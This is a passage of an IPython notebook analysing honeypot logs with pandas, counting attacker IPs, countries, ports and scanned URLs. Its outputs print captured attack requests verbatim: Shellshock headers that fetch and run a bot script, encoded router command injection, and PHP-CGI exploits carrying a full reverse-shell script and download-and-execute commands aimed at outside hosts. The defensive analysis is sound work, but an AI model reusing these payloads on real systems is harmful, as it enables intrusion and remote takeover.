        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1033\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%61%35%31%36%36%65%32%36%20%68%74%74%70%3a%2f%2f%32%31%31%2e%32%34%2e%31%35%2e%31%38%36%3a%33%32%30%30%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%61%35%31%36%36%65%32%36%22%20%3e%3e%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%61%35%31%36%36%65%32%36%2e%73%68%3b%2e%2f%2e%61%35%31%36%36%65%32%36%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "POST /cgi-bin/wlogin.cgi HTTP/1.1\\r\\nConnection: Keep-Alive\\r\\nContent-Length: 27\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nExpect: 100-continue\\r\\nHost: 162.197.24.67\\r\\n\\r\\naa=YWRtaW4%3d&ab=YWRtaW4%3d    1\n",
        "POST /tmUnblock.cgi HTTP/1.1\\r\\nContent-Length: 1036\\r\\n\\r\\n%73%75%62%6d%69%74%5f%62%75%74%74%6f%6e%3d&%63%68%61%6e%67%65%5f%61%63%74%69%6f%6e%3d&%61%63%74%69%6f%6e%3d&%63%6f%6d%6d%69%74%3d&%74%74%63%70%5f%6e%75%6d%3d%32&%74%74%63%70%5f%73%69%7a%65%3d%32&%74%74%63%70%5f%69%70%3d%2d%68%20%60%63%64%20%2f%74%6d%70%3b%65%63%68%6f%20%22%23%21%2f%62%69%6e%2f%73%68%22%20%3e%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%65%63%68%6f%20%22%77%67%65%74%20%2d%4f%20%2e%65%31%38%63%37%31%37%62%20%68%74%74%70%3a%2f%2f%31%38%34%2e%37%38%2e%31%37%37%2e%31%34%34%3a%33%32%30%30%22%20%3e%3e%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%65%63%68%6f%20%22%63%68%6d%6f%64%20%2b%78%20%2e%65%31%38%63%37%31%37%62%22%20%3e%3e%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%65%63%68%6f%20%22%2e%2f%2e%65%31%38%63%37%31%37%62%22%20%3e%3e%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%65%63%68%6f%20%22%72%6d%20%2e%65%31%38%63%37%31%37%62%22%20%3e%3e%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%63%68%6d%6f%64%20%2b%78%20%2e%65%31%38%63%37%31%37%62%2e%73%68%3b%2e%2f%2e%65%31%38%63%37%31%37%62%2e%73%68%60&%53%74%61%72%74%45%50%49%3d%31    1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 19
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('wget')]['request_raw'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 20,
       "text": [
        "GET /cgi-bin/login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-mod/view_help.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /guestbook.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /webnovel/books.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/upload.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /iControl/iControlPortal.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/awstats.pl HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/guestbook.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi/close_window.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /webmail/login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /cgi-bin/learn-message.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    2\n",
        "GET /upload.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 2171\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php system(\"wget 208.85.177.238/.x/hb/php04 -O /tmp/.bash_h1s7;perl /tmp/.bash_h1s7 85.214.73.166;rm -rf /tmp/.bash_h1s7 &\"); ?>set_time_limit(0);\\n$ip = '91.121.105.21';\\n$port = 22;\\n$chunk_size = 1400;\\n$write_a = null;\\n$error_a = null;\\n$shell = 'unset HISTFILE; unset HISTSIZE; uname -a; w; id; /bin/sh -i';\\n$daemon = 0;\\n$debug = 0;\\nif (function_exists('pcntl_fork')) {\\n\\t$pid = pcntl_fork();\\t\\n\\tif ($pid == -1) {\\n\\t\\tprintit(\"ERROR: Can't fork\");\\n\\t\\texit(1);\\n\\t}\\n\\tif ($pid) {\\n\\t\\texit(0);\\n\\t}\\n\\tif (posix_setsid() == -1) {\\n\\t\\tprintit(\"Error: Can't setsid()\");\\n\\t\\texit(1);\\n\\t}\\n\\t$daemon = 1;\\n} else {\\n\\tprintit(\"WARNING: Failed to daemonise.\");\\n}\\nchdir(\"/\");\\numask(0);\\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\\nif (!$sock) {\\n\\tprintit(\"$errstr ($errno)\");\\n\\texit(1);\\n}\\n$descriptorspec = array(\\n   0 => array(\"pipe\", \"r\"),\\n   1 => array(\"pipe\", \"w\"),\\n   2 => array(\"pipe\", \"w\")\\n);\\n$process = proc_open($shell, $descriptorspec, $pipes);\\nif (!is_resource($process)) {\\n\\tprintit(\"ERROR: Can't spawn shell\");\\n\\texit(1);\\n}\\nstream_set_blocking($pipes[0], 0);\\nstream_set_blocking($pipes[1], 0);\\nstream_set_blocking($pipes[2], 0);\\nstream_set_blocking($sock, 0);\\nwhile (1) {\\n\\tif (feof($sock)) {\\n\\t\\tprintit(\"ERROR: Shell connection terminated\");\\n\\t\\tbreak;\\n\\t}\\n\\tif (feof($pipes[1])) {\\n\\t\\tprintit(\"ERROR: Shell process terminated\");\\n\\t\\tbreak;\\n\\t}\\n\\t$read_a = array($sock, $pipes[1], $pipes[2]);\\n\\t$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\\n\\tif (in_array($sock, $read_a)) {\\n\\t\\tif ($debug) printit(\"SOCK READ\");\\n\\t\\t$input = fread($sock, $chunk_size);\\n\\t\\tif ($debug) printit(\"SOCK: $input\");\\n\\t\\tfwrite($pipes[0], $input);\\n\\t}\\n\\tif (in_array($pipes[1], $read_a)) {\\n\\t\\tif ($debug) printit(\"STDOUT READ\");\\n\\t\\t$input = fread($pipes[1], $chunk_size);\\n\\t\\tif ($debug) printit(\"STDOUT: $input\");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n\\tif (in_array($pipes[2], $read_a)) {\\n\\t\\tif ($debug) printit(\"STDERR READ\");\\n\\t\\t$input = fread($pipes[2], $chunk_size);\\n\\t\\tif ($debug) printit(\"STDERR: $input\");\\n\\t\\tfwrite($sock, $input);\\n\\t}\\n}\\n\\nfclose($sock);\\nfclose($pipes[0]);\\nfclose($pipes[1]);\\nfclose($pipes[2]);\\nproc_close($process);\\nfunction printit ($string) {\\n\\tif (!$daemon) {\\n\\t\\tprint \"$string\\n\";\\n\\t}\\n}\\nexit(1);\\n?>    1\n",
        "GET / HTTP/1.0\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: () { :;}; /bin/bash -c \"wget http://stablehost.us/bots/regular.bot -O /tmp/sh;curl -o /tmp/sh http://stablehost.us/bots/regular.bot;sh /tmp/sh;rm -rf /tmp/sh\"    1\n",
        "GET /cgi-bin/test.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-mod/index.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "GET /cgi-sys/defaultwebpage.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 160\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php\\n system(\" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd \"); ?>    1\n",
        "GET /login.cgi HTTP/1.1\\r\\nAccept: */*\\r\\nHost: 54.68.96.53\\r\\nReferer: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh\\r\\nUser-Agent: () { foo;};echo; wget http://stablehost.us/bots/regular.bot -O /tmp/sh;sh /tmp/sh; rm -rf /tmp/sh    1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 20
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('\\.\\.')]['request_raw'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 21,
       "text": [
        "POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1\\r\\nConnection: close\\r\\nContent-Length: 160\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: 54.68.96.53\\r\\nUser-Agent: Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26(KHTML, like Gecko) Version/6.0 Mobile/10A5355d Safari/8536.25\\r\\n\\r\\n<?php\\n system(\" id;killall .klogd;cd /var/tmp;rm -rf ...;mkdir ...;cd ...;wget http://82.141.104.123/ispconfig/temp/.../.../x.tgz;tar xvfz x.tgz;./.klogd \"); ?>    1\n",
        "POST /comments HTTP/1.1\\r\\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\\r\\nAccept-Encoding: gzip,deflate\\r\\nAccept-Language: en-US,en;q=0.8\\r\\nCache-Control: max-age=0\\r\\nConnection: keep-alive\\r\\nContent-Length: 51\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nHost: ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\r\\nOrigin: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com\\r\\nReferer: http://ec2-54-68-96-53.us-west-2.compute.amazonaws.com/index\\r\\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.122 Safari/537.36\\r\\n\\r\\ncomment=Ball+so+hard...that+shit+cray&submit=Submit    1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 21
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Timeseries Graphs (again)\n",
      "\n",
      "1. Check out some of the timeseries graphs below, see if you can find any interesting patterns in the graphs/data.\n",
      "2. Re-run the graphs and see what happens when you filter out the top talker from above.\n",
      "\n",
      "**Hint** remove the top talker from above by using the following code: *attacker_df = attacker_df[attacker_df['attackerIP'] != '']*."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "import matplotlib.pyplot as plt\n",
      "\n",
      "plt.plot(attacker_df['attackerIP'].resample(\"D\", how='count'), label=\"Total Events\")\n",
      "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
      "plt.show()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]",
       "text": [
        "<matplotlib.figure.Figure at 0x104ca82d0>"
       ]
      }
     ],
     "prompt_number": 22
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "for port in attacker_df['victimPort'].value_counts().index:\n",
      "    if port < 10000:\n",
      "        plt.plot(attacker_df[attacker_df == port]['victimPort'].resample(\"D\", how='count'), label=port)\n",
      "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
      "plt.show()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]",
       "text": [
        "<matplotlib.figure.Figure at 0x1086e20d0>"
       ]
      }
     ],
     "prompt_number": 23
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "tempdf = attacker_df[attacker_df['channel'] != 'amun.events']\n",
      "for port in tempdf['victimPort'].value_counts().index:\n",
      "    plt.plot(tempdf[tempdf == port]['victimPort'].resample(\"D\", how='count'), label=port)\n",
      "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
      "plt.show()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]",
       "text": [
        "<matplotlib.figure.Figure at 0x1086cf850>"
       ]
      }
     ],
     "prompt_number": 24
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "for channel in attacker_df['channel'].value_counts().index:\n",
      "    plt.plot(attacker_df[attacker_df['channel'] == channel]['channel'].resample(\"D\", how='count'), label=channel)\n",
      "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
      "plt.show()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]",
       "text": [
        "<matplotlib.figure.Figure at 0x103ce5b10>"
       ]
      }
     ],
     "prompt_number": 25
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "for channel in attacker_df['channel'].value_counts().index:\n",
      "    if channel != \"amun.events\":\n",
      "        plt.plot(attacker_df[attacker_df['channel'] == channel]['channel'].resample(\"D\", how='count'), label=channel)\n",
      "plt.legend(bbox_to_anchor=(1.05, 1), loc=2, borderaxespad=0.)    \n",
      "plt.show()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "display_data",
       "png": "[encoded data removed]",
       "text": [
        "<matplotlib.figure.Figure at 0x109360fd0>"
       ]
      }
     ],
     "prompt_number": 26
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### Further Exploration\n",
      "It's possible to not only look at the top 20 countries hitting the honeypots, but other queries can be combined with the GeoIP info to get a different view on how information is laid out."
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "attacker_df['attackerCountry'].value_counts()[:20]"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 27,
       "text": [
        "China                        52645\n",
        "United States                 4404\n",
        "Taiwan                         850\n",
        "Ukraine                        141\n",
        "Netherlands                    120\n",
        "India                          116\n",
        "Germany                        107\n",
        "Israel                          82\n",
        "Russian Federation              81\n",
        "Canada                          79\n",
        "Korea, Republic of              75\n",
        "United Kingdom                  67\n",
        "Brazil                          63\n",
        "Vietnam                         49\n",
        "United Arab Emirates            46\n",
        "Poland                          46\n",
        "Italy                           45\n",
        "Iran, Islamic Republic of       39\n",
        "France                          37\n",
        "Peru                            31\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 27
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "Below is a snapshot of all the countries that hit the honeypots with shellshock requests. What other types of queries can you think of?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('};')]['attackerCountry'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 28,
       "text": [
        "Brazil       20\n",
        "China        16\n",
        "Taiwan       12\n",
        "Singapore     2\n",
        "Lithuania     1\n",
        "India         1\n",
        "dtype: int64"
       ]
      }
     ],
     "prompt_number": 28
    },
    {
     "cell_type": "markdown",
     "metadata": {},
     "source": [
      "### You can learn a lot from a URL\n",
      "One of the things you can learn from a URL is the types of vulnerabilites people are scanning for.\n",
      "\n",
      "1. What types of vulnerabilites are scanners looking for?\n",
      "2. How many requests for phpMyAdmin were there, and who's making them?"
     ]
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df['request_url'].value_counts()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 29,
       "text": [
        "/                                               90\n",
        "/tmUnblock.cgi                                  58\n",
        "/manager/html                                   41\n",
        "/phpmyadmin/scripts/setup.php                   31\n",
        "/etc/lib/pChart2/examples/index.php              9\n",
        "//typo3/phpmyadmin/scripts/setup.php             6\n",
        "//web/phpMyAdmin/scripts/setup.php               6\n",
        "/cgi-bin/                                        6\n",
        "/favicon.ico                                     6\n",
        "/style.css                                       5\n",
        "/user/soapCaller.bs                              5\n",
        "/w00tw00t.at.blackhats.romanian.anti-sec:%29     5\n",
        "//phpadmin/scripts/setup.php                     4\n",
        "/robots.txt                                      4\n",
        "//cpphpmyadmin/scripts/setup.php                 3\n",
        "...\n",
        "/phpMyAdmin-2.6.2-pl1/scripts/setup.php      1\n",
        "/phpMyAdmin-2.8.0/scripts/setup.php          1\n",
        "//cgi-bin/php                                1\n",
        "/phpMyAdmin-2.6.0-rc1/scripts/setup.php      1\n",
        "/sys-cgi                                     1\n",
        "/cgi-sys/php5                                1\n",
        "/cgi-bin/admin.html                          1\n",
        "/phpMyAdmin-2.6.0-beta1/scripts/setup.php    1\n",
        "/xmlrpc.php                                  1\n",
        "/phpMyAdmin-2.6.4-pl1/scripts/setup.php      1\n",
        "/phpMyAdmin-2.6.1-rc2/scripts/setup.php      1\n",
        "/web-console/ServerInfo.jsp                  1\n",
        "/php-my-admin/scripts/setup.php              1\n",
        "/phpmyadmin2/scripts/setup.php               1\n",
        "/phpMyAdmin-2.6.4-rc1/scripts/setup.php      1\n",
        "Length: 178, dtype: int64"
       ]
      }
     ],
     "prompt_number": 29
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "len(glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['channel'].tolist())"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 30,
       "text": [
        "93"
       ]
      }
     ],
     "prompt_number": 30
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['attackerIP'].unique()"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "metadata": {},
       "output_type": "pyout",
       "prompt_number": 31,
       "text": [
        "array([u'198.12.87.152', u'104.192.103.3', u'101.69.247.10',\n",
        "       u'184.154.169.194', u'89.248.171.2', u'222.175.241.131'], dtype=object)"
       ]
      }
     ],
     "prompt_number": 31
    },
    {
     "cell_type": "code",
     "collapsed": false,
     "input": [
      "for ip in glastopf_df[glastopf_df['request_raw'].str.contains('phpMyAdmin')]['attackerIP'].unique().tolist():\n",
      "    print \"%s - %s\" %(ip, glastopf_df[glastopf_df['attackerIP'] == ip]['attackerCountry'].unique())"
     ],
     "language": "python",
     "metadata": {},
     "outputs": [
      {
       "output_type": "stream",
       "stream": "stdout",
       "text": [
        "198.12.87.152 - ['United States']\n",
        "104.192.103.3 - [None]\n",
        "101.69.247.10 - ['China']\n",
        "184.154.169.194 - ['United States']\n",
        "89.248.171.2 - ['Netherlands']\n",
        "222.175.241.131 - ['China']\n"
       ]
      }
     ],
     "prompt_number": 32
    }
   ],
   "metadata": {}
  }
 ]
}